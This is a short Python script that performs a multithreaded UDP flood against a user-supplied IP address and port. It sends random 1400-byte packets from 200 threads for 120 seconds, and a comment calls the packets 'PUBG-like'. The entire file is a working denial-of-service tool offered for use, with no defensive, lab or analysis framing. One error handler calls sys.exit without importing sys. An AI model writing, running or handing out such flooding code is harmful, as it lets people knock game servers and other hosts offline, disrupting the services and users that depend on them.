import socket
import threading
import time
import random

# Default config
THREADS = 200          # Default threads—tweakable later
DURATION = 120         # Default 120 seconds as requested
PACKET_SIZE = 1400     # Bytes (PUBG-like payload)

# Random payload
payload = random._urandom(PACKET_SIZE)

# Flood function
def flood(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + DURATION
        while time.time() < end_time:
            sock.sendto(payload, (target_ip, target_port))
    except Exception as e:
        print(f"Thread error: {e}")

# Main execution
if __name__ == "__main__":
    # Get user input for IP and port
    TARGET_IP = input("Enter target IP (e.g., 8.8.8.8): ")
    try:
        TARGET_PORT = int(input("Enter target port (e.g., 53): "))
    except ValueError:
        print("Error: Port must be a number!")
        sys.exit(1)

    print(f"Starting UDP flood on {TARGET_IP}:{TARGET_PORT} with {THREADS} threads for {DURATION} seconds...")

    # Launch threads
    threads_list = []
    start_time = time.time()
    for _ in range(THREADS):
        t = threading.Thread(target=flood, args=(TARGET_IP, TARGET_PORT))
        t.start()
        threads_list.append(t)

    # Wait for threads to finish
    for t in threads_list:
        t.join()

    elapsed = time.time() - start_time
    print(f"Flood complete in {elapsed:.2f} seconds!")
